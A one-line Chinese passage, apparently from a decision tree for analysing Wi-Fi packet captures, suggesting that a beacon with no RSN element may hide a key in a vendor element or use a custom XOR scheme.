  ⇒ **非标准 CCMP**（beacon 里没有 RSN IE）⇒ 转查 beacon 的 vendor IE 是否藏钥，或按"序号 1..10 + 帧长呈分片特征"试自定义 XOR
